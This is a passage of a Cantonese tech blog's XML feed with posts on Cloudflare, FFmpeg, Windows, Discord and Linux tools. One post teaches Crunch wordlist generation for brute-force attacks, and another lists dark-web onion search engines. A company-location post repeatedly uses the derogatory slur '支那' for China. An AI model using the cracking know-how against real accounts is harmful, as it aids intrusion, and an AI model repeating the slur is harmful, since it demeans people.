<h2 id="停止掃瞄路由器裝置"><a href="#停止掃瞄路由器裝置" class="headerlink" title="停止掃瞄路由器裝置"></a>停止掃瞄路由器裝置</h2><p>如果你想停止，唔再繼續 Scan 既話就輸入以下指令 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net.probe off</span><br></pre></td></tr></table></figure>

<p><a href="https://www.bettercap.org/modules/ethernet/net.probe/">https://www.bettercap.org/modules/ethernet/net.probe/</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Bettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 使用第三方程式查看電腦硬件資訊 (GUI)</title>
    <url>/2022/01/15/check-your-computer-hardware-inforamtion-with-windows-gui-3-program/</url>
    <content><![CDATA[<h1 id="1-Speccy"><a href="#1-Speccy" class="headerlink" title="1. Speccy"></a>1. Speccy</h1><img src="/2022/01/15/check-your-computer-hardware-inforamtion-with-windows-gui-3-program/Speccy.png" class="">

<h2 id="官方網站"><a href="#官方網站" class="headerlink" title="官方網站"></a>官方網站</h2><ul>
<li><a href="https://www.ccleaner.com/speccy">Speccy</a></li>
</ul>
<h1 id="2-CPU-Z"><a href="#2-CPU-Z" class="headerlink" title="2. CPU-Z"></a>2. CPU-Z</h1><img src="/2022/01/15/check-your-computer-hardware-inforamtion-with-windows-gui-3-program/CPU-Z.png" class="">

<h2 id="官方網站-1"><a href="#官方網站-1" class="headerlink" title="官方網站"></a>官方網站</h2><ul>
<li><a href="https://www.cpuid.com/softwares/cpu-z.html">CPU-Z</a></li>
</ul>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>指令格式 - 不允許使用 &amp; 符號字元。&amp; 運算子已保留供未來使用; 請使用雙引號將 &amp; 符號括住 (&quot;&amp;&quot;) 以將它當作字串的一部分來傳遞。</title>
    <url>/2022/05/26/cli-%E4%B8%8D%E5%85%81%E8%A8%B1%E4%BD%BF%E7%94%A8-%E7%AC%A6%E8%99%9F%E5%AD%97%E5%85%83%E3%80%82/</url>
    <content><![CDATA[<h1 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h1><p>有時候使用一些指令下載檔案，發現指令台出現以下錯誤</p>
<pre><code>位於 線路:1 字元:314
+ ... dGVMZXNzVGhhbiI6eyJBV1M6RXBvY2hUaW1lIjoxNjUzNTcxNTA3fX19XX0_&amp;Signatur ...
+                                                                 ~
不允許使用 &amp; 符號字元。&amp; 運算子已保留供未來使用; 請使用雙引號將 &amp; 符號括住 (&quot;&amp;&quot;) 以將它當作字串的一部分來傳遞。
</code></pre>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>原因是因為於指令台當中，不支援有 <code>&amp;@$@!^#</code> 符號的連結。</p>
<h1 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h1><p>只需要將你的超連結用雙引號包住就能下載了。</p>
<p>例子 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg.exe -i &quot;https://cf-hls-media.sndcdn.com/playlist/12Up8i2L.128.mp3/playlist.m3u8?Policy=eyJTdGF0ZW1lbnQiOlt7l0aW9uIjp7IkRhdGVMZXNzVGhhbiI6eyJBV1M6RXBvY2hUaW1lIjoxNjUzNTcxNTA3fX19XX0_&amp;xNjUzNTcxNTA3fX19X&quot; -c copy testing.mp3</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>三修系統大撚哂</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>問題</tag>
      </tags>
  </entry>
  <entry>
    <title>Cloudflare - 526 Error 修復</title>
    <url>/2022/07/05/cloudflare-526-Error-fix/</url>
    <content><![CDATA[<img src="/img/Post/image/Cloudflare/cloudflare-icon.svg" width="200px"/>

<h1 id="為什麼出現-526-Error？"><a href="#為什麼出現-526-Error？" class="headerlink" title="為什麼出現 526 Error？"></a>為什麼出現 526 Error？</h1><p>根據官方說明，會出現是因為 SSL Cert 問題。<br>因為你使用了 <code>完整 (嚴格)</code> 的 <code>SSL/TLS</code> 加密模式，然而你伺服器所使用的 Cert 是自簽的憑證，<br>因而出現了以下圖片的 526 Error：</p>
<p><img src="526.gif"></p>
<h1 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h1><p>將 <code>SSL/TLS</code> 加密模式改為 <code>完整</code>。</p>
<p><img src="fix.png"></p>
]]></content>
      <categories>
        <category>Domain</category>
      </categories>
      <tags>
        <tag>問題</tag>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>Cloudflare - 為你的網站安裝 Analytics 分析器</title>
    <url>/2022/07/05/cloudflare-add-your-web-analytics/</url>
    <content><![CDATA[<img src="/img/Post/image/Cloudflare/cloudflare-icon.svg" width="200px"/>

<h1 id="安裝需求"><a href="#安裝需求" class="headerlink" title="安裝需求"></a>安裝需求</h1><p>以下內容你必須先有一個網站才能繼續使用，這邊的示範會使用 Hexo butterfly 進行，<br>如果沒有網站，可以使用一些免費的網站伺服器，例如：</p>
<ul>
<li>Github Pages - 由 Microsoft 擁有，可以不用太擔心被入侵的風險</li>
<li>000webhost - 於 2016 年被駭客入侵，造成大量客戶的資料洩露。<br>  免費用就好，重要東西不要放進去。</li>
<li>Cloudflare Pages - 使用 Github 連接</li>
</ul>
<h1 id="第一步-進入-Cloudflare-首頁"><a href="#第一步-進入-Cloudflare-首頁" class="headerlink" title="第一步 - 進入 Cloudflare 首頁"></a>第一步 - 進入 Cloudflare 首頁</h1><p>請先登入 <a href="https://dash.cloudflare.com/login">Cloudflare</a>，如果沒有帳號，請申請一個。</p>
<p><img src="1.gif"></p>
<h2 id="第二步-點擊分析"><a href="#第二步-點擊分析" class="headerlink" title="第二步 - 點擊分析"></a>第二步 - 點擊分析</h2><p>展開左面板的 <code>分析</code> 然後選擇 <code>Web Analytics</code>。</p>
<p><img src="2.gif"></p>
<h2 id="第三步-開始使用-Web-Analytics"><a href="#第三步-開始使用-Web-Analytics" class="headerlink" title="第三步 - 開始使用 Web Analytics"></a>第三步 - 開始使用 Web Analytics</h2><p>選擇你要用的主機名稱 (你的網域)，選擇後按 <code>完成</code>。</p>
<p><img src="3.gif"></p>
<h2 id="第四步-設定完成"><a href="#第四步-設定完成" class="headerlink" title="第四步 - 設定完成"></a>第四步 - 設定完成</h2><p>已完成設定，接下來需要將 JS 程式碼置入你的網站中。</p>
<p><img src="4.gif"></p>
<h2 id="第五步-管理網站"><a href="#第五步-管理網站" class="headerlink" title="第五步 - 管理網站"></a>第五步 - 管理網站</h2><p>按 <code>管理網站</code>。</p>
<p><img src="5.gif"></p>
<h2 id="第六步-安裝-JS-程式碼"><a href="#第六步-安裝-JS-程式碼" class="headerlink" title="第六步 - 安裝 JS 程式碼"></a>第六步 - 安裝 JS 程式碼</h2><p>打開 <code>管理進階</code> &gt; <code>停用自動設定</code>。</p>
<div class="note warning flat">
    注意：這邊的自動設定是指 Cloudflare 會自動為你的網站安裝程式碼, 但要注意因為 Cloudflare 只是會修改你網站上的檔案, 而你自己本機的檔案通常是還沒有被修改, 當你想再上傳本機的檔案到網站時, 你的舊檔案可能就會取代了原本 Cloudflare 幫你設定了的檔案, 這樣即使是使用了自動設定也會因此而失效
</div>

<p>因應這樣的原因，我會建議大家將程式碼安裝至你本機的文件檔案內，當然你也可以自動設定 (似乎情況)。</p>
<p><img src="6.gif"></p>
<h1 id="第七步-網站安裝程式碼"><a href="#第七步-網站安裝程式碼" class="headerlink" title="第七步 - 網站安裝程式碼"></a>第七步 - 網站安裝程式碼</h1><p>只需將你網頁中的 <head></head> 之間插入上圖內的 JS 程式碼就會生效。</p>
<p><img src="head.png"></p>
<h1 id="第八步-Hexo-Butterfly-新增-JS-程式碼"><a href="#第八步-Hexo-Butterfly-新增-JS-程式碼" class="headerlink" title="第八步 - Hexo Butterfly 新增 JS 程式碼"></a>第八步 - Hexo Butterfly 新增 JS 程式碼</h1><p>因應 Butterfly 原生的 <code>yml</code> 修改方法是沒效果的，我們需要修改原檔。</p>
<h2 id="第九步-開啟路徑"><a href="#第九步-開啟路徑" class="headerlink" title="第九步 - 開啟路徑"></a>第九步 - 開啟路徑</h2><p>開啟以下的路徑：</p>
<pre><code>blog/themes/butterfly/layout/includes/head/analytics.pug
</code></pre>
<h2 id="第十步-修改內容"><a href="#第十步-修改內容" class="headerlink" title="第十步 - 修改內容"></a>第十步 - 修改內容</h2><p>移至第 21-22 行，由原本的程式碼：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> theme.cloudflare_analytics</span><br><span class="line">  script(defer data-pjax src=<span class="string">&#x27;https://static.cloudflareinsights.com/beacon.min.js&#x27;</span> data-cf-beacon=<span class="string">`&#123;&quot;token&quot;: &quot;<span class="subst">$&#123;theme.cloudflare_analytics&#125;</span>&quot;&#125;`</span>)</span><br></pre></td></tr></table></figure>

<p>改成以下這樣後再儲存檔案就會生效了.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> theme.cloudflare_analytics</span><br><span class="line">  script(defer data-pjax src=<span class="string">&#x27;https://static.cloudflareinsights.com/beacon.min.js&#x27;</span> data-cf-beacon=<span class="string">`&#123;&quot;token&quot;: &quot;1383182408142184vfeav8a84324821x&quot;&#125;`</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Domain</category>
      </categories>
      <tags>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>Cloudflare - 將網域所有連線一律使用 HTTPS 加密</title>
    <url>/2022/07/05/cloudflare-mandatory-redirect-https/</url>
    <content><![CDATA[<img src="/img/Post/image/Cloudflare/cloudflare-icon.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上一篇文書提及到如果購買網域和設置 DNS，但是以上的操作只是 DNS 的操作，並沒有啟動到 HTTPS 的連線，本文章會教你如何強制使用 HTTPS。</p>
<p><img src="https.png"></p>
<h1 id="Why-HTTPS"><a href="#Why-HTTPS" class="headerlink" title="Why HTTPS ?"></a>Why HTTPS ?</h1><p>HTTPS 是用於在 Web 瀏覽器和網站之間發送數據的加密協議。<br>HTTPS 被加密以提高數據傳輸的安全性，用戶傳輸敏感數據時非常重要，例如通過登錄銀行賬戶、電子郵件服務。<br>如果沒有加密，駭客會很容易截取你上網的所有封包連線，繼而取得你的所有傳輸內容，包括密碼，信用卡號碼等。<br>位於網路發達的年代，任何網站都應該使用 HTTPS 連線，尤其是需要登錄憑據的網站，這是保護重要資料流出的可能性。</p>
<p><img src="why.png"></p>
<h1 id="回到-Cloudflare-首頁"><a href="#回到-Cloudflare-首頁" class="headerlink" title="回到 Cloudflare 首頁"></a>回到 Cloudflare 首頁</h1><p>回到 Cloudflare 首頁，選擇你的網域後，點擊 <code>SSL-TLS</code> &gt; <code>概觀</code>。</p>
<p><img src="1.png"></p>
<h2 id="修改概觀"><a href="#修改概觀" class="headerlink" title="修改概觀"></a>修改概觀</h2><p>將原本的 <code>彈性</code> 改為 <code>完成</code>。</p>
<p><img src="2.png"></p>
<h2 id="修改邊緣憑證"><a href="#修改邊緣憑證" class="headerlink" title="修改邊緣憑證"></a>修改邊緣憑證</h2><p>點擊左方的 <code>邊緣憑證</code>。</p>
<p><img src="3.png"></p>
<h3 id="啟動"><a href="#啟動" class="headerlink" title="啟動"></a>啟動</h3><p>將以下四樣啟動：</p>
<ul>
<li>一律使用 HTTPS</li>
<li>伺機加密</li>
<li>TLS 1.3</li>
<li>自動改寫 HTTPS</li>
</ul>
<p><img src="4.png"></p>
<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>完成後再次進入網站就會發現已經變為 <code>HTTPS</code>。</p>
<p><img src="d.gif"></p>
]]></content>
      <categories>
        <category>Domain</category>
      </categories>
      <tags>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>各大公司總部，出廠和生產商位置</title>
    <url>/2022/05/17/company-source/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺世界唔同各地都有唔同既產品，<br>而呢篇文會講一啲公司既產品既內容。</p>
<p>以下全部以香港做例子。</p>
<h1 id="各大公司詳情"><a href="#各大公司詳情" class="headerlink" title="各大公司詳情"></a>各大公司詳情</h1><p>以下列出公司位置，生產商等資訊。</p>
<hr>
<h2 id="Apple-蘋果公司"><a href="#Apple-蘋果公司" class="headerlink" title="Apple 蘋果公司"></a>Apple 蘋果公司</h2><ul>
<li>總部位於美國加州庫比蒂諾的跨國科技公司</li>
<li>生產商幾乎係支那製</li>
</ul>
<h2 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h2><ul>
<li>總部位於美國加州山景城的跨國科技公司</li>
<li>以 Pixel 為例，會係美國製，但係香港買唔到。</li>
</ul>
<h2 id="Western-Digital-威騰電子"><a href="#Western-Digital-威騰電子" class="headerlink" title="Western Digital 威騰電子"></a>Western Digital 威騰電子</h2><ul>
<li>威騰電子（英語：Western Digital Corporation），簡稱WD、西數或威騰</li>
<li>總位位於美國加利福尼亞州爾灣</li>
<li>生產商係泰國</li>
</ul>
<h2 id="Verbatim-威寶公司"><a href="#Verbatim-威寶公司" class="headerlink" title="Verbatim 威寶公司"></a>Verbatim 威寶公司</h2><ul>
<li>主要生產儲存裝置和快閃記憶體的公司</li>
<li>總部位於台灣中環公司（英文：CMC Magnetics Corporation），前身係一間美國公司，後來被收購先變左做台灣。</li>
<li>生產商係支那</li>
</ul>
<p>以上資料不定期更新。</p>
<h2 id="Mullvad"><a href="#Mullvad" class="headerlink" title="Mullvad"></a>Mullvad</h2><ul>
<li>位於瑞典的開源商業VPN服務</li>
<li>最可信的VPN服務</li>
</ul>
<h2 id="Adidas"><a href="#Adidas" class="headerlink" title="Adidas"></a>Adidas</h2><ul>
<li>總部位於德國黑措根奧拉赫</li>
<li>生產商幾乎係支那</li>
</ul>
]]></content>
      <categories>
        <category>location</category>
      </categories>
  </entry>
  <entry>
    <title>Crunch - 建立 Wordlists 字典庫</title>
    <url>/2022/01/15/crunch-commands/</url>
    <content><![CDATA[<img src="cover.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>數字英文符號既組合有非常多，但係我地冇可能個個慢慢咁打，<br>有見及此，呢款工具就係會用勁快既方式去 Gen 一個 wordlist 俾你，再配合其他 BruteForce 工具去進行爆破程序。</p>
<h1 id="指令使用"><a href="#指令使用" class="headerlink" title="指令使用"></a>指令使用</h1><hr>
<h2 id="自訂輸出檔案名稱"><a href="#自訂輸出檔案名稱" class="headerlink" title="自訂輸出檔案名稱"></a>自訂輸出檔案名稱</h2><p>如果要自訂檔案名稱可以使用以下兩種其中一個參數 :</p>
<ul>
<li><code>&gt;</code> files.name (方法一)</li>
<li><code>-o</code> files.name (方法二)</li>
</ul>
<h2 id="0-9-wordlist-txt-2-char"><a href="#0-9-wordlist-txt-2-char" class="headerlink" title="0-9 wordlist.txt (2 char)"></a>0-9 wordlist.txt (2 char)</h2><p>生產字串只有 0-9 的數字，然後當中文字只有由 <code>一位數</code> 至 <code>兩位數</code>。</p>
<blockquote>
<p>簡略 : 即是 0-99 的數目字生產。</p>
</blockquote>
<h3 id="指令方法一"><a href="#指令方法一" class="headerlink" title="指令方法一"></a>指令方法一</h3><p>呢個示範用左 <code>&gt;</code> 去自訂名稱。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crunch 1 2 0123456789 &gt; wordlist.txt </span><br></pre></td></tr></table></figure>

<img src="/2022/01/15/crunch-commands/1.png" class="">

<h3 id="指令方法二"><a href="#指令方法二" class="headerlink" title="指令方法二"></a>指令方法二</h3><p>呢個示範用左 <code>-o</code> 去自訂名稱。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crunch  1 2 0123456789 -o wordlist.txt</span><br></pre></td></tr></table></figure>

<img src="/2022/01/15/crunch-commands/2.png" class="">

<h3 id="結果如下"><a href="#結果如下" class="headerlink" title="結果如下"></a>結果如下</h3><p>直接 <code>cat</code> 到 <code>wordlist.txt</code> 會看到行數是由 <code>0-99</code> 的數目字，由於太多行了，我只顯示圖片最頭的數目字。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat wordlist.txt</span><br></pre></td></tr></table></figure>

<img src="/2022/01/15/crunch-commands/0-99.png" class="">

<p>參考資料:<br><a href="https://www.geeksforgeeks.org/kali-linux-crunch-utility/">https://www.geeksforgeeks.org/kali-linux-crunch-utility/</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Darkweb - Search Engine</title>
    <url>/2022/01/14/darkweb-search-engine/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>網路世界有分明同暗既領域，而我地平時用緊既 Google , bing 呢d 用黎 查野既 Search Engine 係喺一個大公司既監視下先會俾你既網站出現喺 Google result.<br>暗既領域就係喺冇呢d大公司既 mon 住，即係簡單黎講，你鐘意放乜就放乜。<br>而你入去呢個 Network 係需要安裝 Torbrowser 既。<br>入面有乜就大家自己探索下…<br>以下我放幾個專用睇查 Darkweb 野既 Search Engine。</p>
<p>另外，睇還睇記得做好安全措施先好入去，例如</p>
<ul>
<li>用鬼機入去</li>
<li>強而有力既 VPN</li>
<li>用 Linux 機入 (建議)</li>
</ul>
<h2 id="網站列表"><a href="#網站列表" class="headerlink" title="網站列表"></a>網站列表</h2><ul>
<li><ol>
<li>Darknetsearch</li>
</ol>
</li>
<li><ol start="2">
<li>Ahmia</li>
</ol>
</li>
<li><ol start="3">
<li>Torch</li>
</ol>
</li>
<li><ol start="4">
<li>TorDex</li>
</ol>
</li>
</ul>
<h4 id="1-Ahmia"><a href="#1-Ahmia" class="headerlink" title="1. Ahmia"></a>1. Ahmia</h4><p><a href="http://ahmiacawquincyw7d4kmsopfi667eqdhuva3sxfpxiqymmojzb7fchad.onion/">http://ahmiacawquincyw7d4kmsopfi667eqdhuva3sxfpxiqymmojzb7fchad.onion/</a><br><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/">http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/</a></p>
<img src="/2022/01/14/darkweb-search-engine/ahmia.png" class="">

<h4 id="2-Torch"><a href="#2-Torch" class="headerlink" title="2. Torch"></a>2. Torch</h4><p><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/">http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/</a><br><a href="http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/cgi-bin/omega/omega">http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/cgi-bin/omega/omega</a></p>
<img src="/2022/01/14/darkweb-search-engine/torch.png" class="">
<img src="/2022/01/14/darkweb-search-engine/torch-2.png" class="">

<h4 id="3-Darknetsearch"><a href="#3-Darknetsearch" class="headerlink" title="3. Darknetsearch"></a>3. Darknetsearch</h4><p>darknetsearch.io</p>
<img src="/2022/01/14/darkweb-search-engine/darknet-search.png" class="">

<h4 id="4-TorDex"><a href="#4-TorDex" class="headerlink" title="4. TorDex"></a>4. TorDex</h4><p><a href="http://tordexpmg4xy32rfp4ovnz7zq5ujoejwq2u26uxxtkscgo5u3losmeid.onion/">http://tordexpmg4xy32rfp4ovnz7zq5ujoejwq2u26uxxtkscgo5u3losmeid.onion/</a></p>
<img src="/2022/01/14/darkweb-search-engine/TorDex.png" class="">


<p>參考資料…<br><a href="https://darknetone.com/a-look-at-the-5-best-dark-web-search-engines-in-2021/">https://darknetone.com/a-look-at-the-5-best-dark-web-search-engines-in-2021/</a></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>暗網</tag>
      </tags>
  </entry>
  <entry>
    <title>唔同既 Linux Terminal 工具</title>
    <url>/2022/01/12/different-terminal-with-linux/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>成日用黎用去都係 Default 既 Linux Terminal 想轉下其他 Terminal？</p>
<p>以下介紹幾款！</p>
<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><ul>
<li><a href="https://konsole.kde.org/">Konsole</a> - KDE’s Terminal Emulator</li>
<li><a href="https://terminator-gtk3.readthedocs.io/en/latest/">Terminator</a> - simplest Terminator</li>
</ul>
<h2 id="下載-Konsole"><a href="#下載-Konsole" class="headerlink" title="下載 Konsole"></a>下載 Konsole</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install konsole -y</span><br></pre></td></tr></table></figure>

<img src="/2022/01/12/different-terminal-with-linux/icon_konsole.png" class="">

<h2 id="下載-Terminator"><a href="#下載-Terminator" class="headerlink" title="下載 Terminator"></a>下載 Terminator</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install terminator -y</span><br></pre></td></tr></table></figure>

<img src="/2022/01/12/different-terminal-with-linux/icon_terminator.png" class="">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Discord - 關閉開機自動開啟程式</title>
    <url>/2022/06/13/disabled-Discord-startup/</url>
    <content><![CDATA[<img src="discord-icon.svg" width="200px"/>

<h1 id="Discord-預設"><a href="#Discord-預設" class="headerlink" title="Discord 預設"></a>Discord 預設</h1><p>當你安裝左 Discord 之後，其實 Discord 本身既設定係會幫你整埋每當你開機既時候都會自動幫你開 Discord，咁樣既設定固然係方便，但係當你部機係老爺機，又或者程式越黎越多既時候，呢個自動開啟會變成你電腦既負擔，繼而電腦變慢。</p>
<h1 id="Windows-Regedit-說明"><a href="#Windows-Regedit-說明" class="headerlink" title="Windows Regedit 說明"></a>Windows Regedit 說明</h1><p>Discord 本身都有提供一個方法俾你唔好再開機就開 Discord，其實佢個原理只係幫你喺 <code>regedit</code> 入面 delete 一樣野，而路徑係：</p>
<pre><code>電腦\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</code></pre>
<p>上面呢個路徑入面既內容就係你呢部機開機之後會跟住開既程式。</p>
<div class="note info flat">
    說明：只要將佢 delete 就會失效唔再開機會啟用，而新增就會幫你開機啟動程式。
</div>

<p><img src="regedit.gif"></p>
<h1 id="修改-Setttings"><a href="#修改-Setttings" class="headerlink" title="修改 Setttings"></a>修改 Setttings</h1><p>以下撳制方法：</p>
<ol>
<li>首先登入你既 Discord</li>
<li>撳下面既 <i class="fa-solid fa-gear"></i></li>
</ol>
<img src="/2022/06/13/disabled-Discord-startup/discord.png" class="">

<h2 id="Windows-設定"><a href="#Windows-設定" class="headerlink" title="Windows 設定"></a>Windows 設定</h2><ol start="3">
<li>黎到呢個位置喺左邊搵 <code>Windows 設定</code>。</li>
</ol>
<img src="/2022/06/13/disabled-Discord-startup/haha.png" class="">

<h2 id="系統啟動行為"><a href="#系統啟動行為" class="headerlink" title="系統啟動行為"></a>系統啟動行為</h2><ol start="4">
<li>將開啟 Discord 熄左佢，咁就唔會再開機啟動，當然你想開返只要開返佢就得。</li>
</ol>
<img src="/2022/06/13/disabled-Discord-startup/off.png" class="">]]></content>
      <categories>
        <category>Discord</category>
      </categories>
      <tags>
        <tag>Regedit</tag>
      </tags>
  </entry>
  <entry>
    <title>FFMPEG - 轉換格式工具</title>
    <url>/2021/12/11/ffmpeg-command/</url>
    <content><![CDATA[<img src="/img/Post/image/FFMPEG/cover.png" width="200px"/>


<h1 id="FFMPEG"><a href="#FFMPEG" class="headerlink" title="FFMPEG"></a>FFMPEG</h1><p>FFmpeg 是處理多媒體內容（例如音頻、視頻、字幕和相關元數據）的庫和工具的集合。</p>
<h2 id="Libraries"><a href="#Libraries" class="headerlink" title="Libraries"></a>Libraries</h2><ul>
<li><code>libavcodec</code> 提供了更廣泛的編解碼器的實現。</li>
<li><code>libavformat</code> 實現流協議、容器格式和基本 I/O 訪問。</li>
<li><code>libavutil</code> 包括散列器、解壓縮器和其他實用功能。</li>
<li><code>libavfilter</code> 提供了通過連接過濾器的有向圖來改變解碼的音頻和視頻的方法。</li>
<li><code>libavdevice</code> 提供了訪問捕獲和播放設備的抽象。</li>
<li><code>libswresample</code> 實現音頻混合和重採樣例程。</li>
<li><code>libswscale</code> 實現顏色轉換和縮放例程。</li>
</ul>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul>
<li><a href="https://ffmpeg.org/ffmpeg.html">ffmpeg</a> 是一個命令行工具箱操作、轉換和流式傳輸多媒體內容。</li>
<li><a href="https://ffmpeg.org/ffplay.html">ffplay</a> 是一個簡約的多媒體播放器。</li>
<li><a href="https://ffmpeg.org/ffprobe.html">ffprobe</a> 是一個簡單的檢查分析工具多媒體內容。</li>
</ul>
<h1 id="合成媒體指令"><a href="#合成媒體指令" class="headerlink" title="合成媒體指令"></a>合成媒體指令</h1><p>以下是有關使用合成媒體指令。</p>
<ul>
<li><code>-i</code> 轉檔用</li>
<li>-c:v acc</li>
</ul>
<h2 id="影片和音樂合成並重新編碼"><a href="#影片和音樂合成並重新編碼" class="headerlink" title="影片和音樂合成並重新編碼"></a>影片和音樂合成並重新編碼</h2><p>將影片和音樂合成，並重新編碼一次。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c:v copy -c:a aac output.mp4</span><br></pre></td></tr></table></figure>

<h2 id="影片和音樂複製而不重新編碼"><a href="#影片和音樂複製而不重新編碼" class="headerlink" title="影片和音樂複製而不重新編碼"></a>影片和音樂複製而不重新編碼</h2><p>這裡會將影片和音樂合成，但是不會重新編碼一次。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c copy output.mkv</span><br></pre></td></tr></table></figure>

<h1 id="替換影片內的音樂"><a href="#替換影片內的音樂" class="headerlink" title="替換影片內的音樂"></a>替換影片內的音樂</h1><p>將你原本的音樂變成你想要的音樂，影片不會換掉。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c:v copy -c:a aac -map 0:v:0 -map 1:a:0 output.mp4</span><br></pre></td></tr></table></figure>

<h1 id="下載媒體指令"><a href="#下載媒體指令" class="headerlink" title="下載媒體指令"></a>下載媒體指令</h1><p>以下是有關下載媒體的指令。</p>
<ul>
<li><code>-i</code> 轉檔用</li>
</ul>
<h2 id="下載網路上的影片-m3u8"><a href="#下載網路上的影片-m3u8" class="headerlink" title="下載網路上的影片 (m3u8)"></a>下載網路上的影片 (m3u8)</h2><p>使用此方法可以下載大部分網路上經 <code>m3u8 HLS</code> 處理的影片。</p>
<div class="note warning flat">
    注意 : 此方法只適用於未經處理的 <code>m3u8 檔案</code>。
</div>

<p><strong>格式 :</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -i [m3u8 link] -c copy [output name.mp4]</span><br></pre></td></tr></table></figure>

<p><strong>完整示範 :</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -i file.m3u8 -c copy file.mp4</span><br></pre></td></tr></table></figure>

<h1 id="封面圖選項"><a href="#封面圖選項" class="headerlink" title="封面圖選項"></a>封面圖選項</h1><p>以下指令可以將圖片放置到影片，並將他設定為封面圖片。</p>
<ul>
<li>[input video] // 輸入你要加入封面圖的影片檔名</li>
<li>[input image] // 輸入你要加入至影片封面圖的圖片檔名</li>
<li>[added_cover_video] // 輸入兩者合成後的影片檔名 (輸出檔名)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg.exe -i [input video] -i [input image] -map 1 -map 0 -acodec copy -vcodec copy [added_cover_video]</span><br></pre></td></tr></table></figure>

<p><strong>例子 :</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg.exe -i &quot;IPX-404.mp4&quot; -i &quot;IPX-404.jpg&#x27; -map 1 -map 0  -acodec copy -vcodec copy &quot;cover_IPX_404.mp4&quot;</span><br></pre></td></tr></table></figure>

<h1 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h1><p>以下是有關 Screenshot 影片內的指令。</p>
<p>我們需要使用兩個指令 :</p>
<ul>
<li><code>-ss</code> [HH:MM:SS:MILLISECONDS] // 代表 seek，意思是尋找要進行 Screenshot 的位置，然後在後面輸入參數 [HH:MM:SS:MILLISECONDS]。</li>
<li><code>-frames:v</code> [NUMBER] // Screenshot 多小個數量。</li>
</ul>
<h2 id="Screenshot-格式"><a href="#Screenshot-格式" class="headerlink" title="Screenshot 格式"></a>Screenshot 格式</h2><p>以下指令說明 :</p>
<ul>
<li><code>-i</code> inputvideo.mp4 (你要 Screenshot 的檔案)</li>
<li><code>-ss</code> 00:00:10 (影片內你要 Screensoht 的秒數)</li>
<li><code>-frames:v</code> 1 (輸出圖片數量)</li>
<li><code>sc.jpg</code> (輸出檔案名稱)</li>
</ul>
<h3 id="輸出一張圖片"><a href="#輸出一張圖片" class="headerlink" title="輸出一張圖片"></a>輸出一張圖片</h3><p>將 <code>inputvideo.mp4</code> 的第 10 秒鐘 Screenshot，然後只輸出一張圖片，並將輸出檔案名稱改為 <code>sc.jpg</code>。</p>
<div class="note info flat">
